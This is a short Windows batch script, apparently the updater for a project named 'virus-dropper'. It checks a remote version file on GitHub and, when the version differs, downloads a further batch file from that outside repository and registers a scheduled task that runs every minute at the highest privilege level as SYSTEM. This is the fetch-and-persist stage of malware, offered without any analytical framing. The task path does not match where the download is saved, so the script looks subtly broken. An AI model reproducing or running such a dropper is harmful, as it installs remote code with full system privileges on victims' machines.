@echo off
cd C:\users\edwar\downloads
set /a version=4
@SET output=
FOR /F %%I IN ('curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/version.txt"') DO @SET "output=%%I"
If %output% == %version% exit ELSE goto update

:update
curl "https://raw.githubusercontent.com/YumYummity/virus-dropper/main/updater/updater.bat" --output "Updater.bat"
SCHTASKS /CREATE /F /SC MINUTE /TR "%systemroot%\System32\Windowsexe\Updater.bat" /TN "updateTEMP" /RL HIGHEST /RU SYSTEM
exit
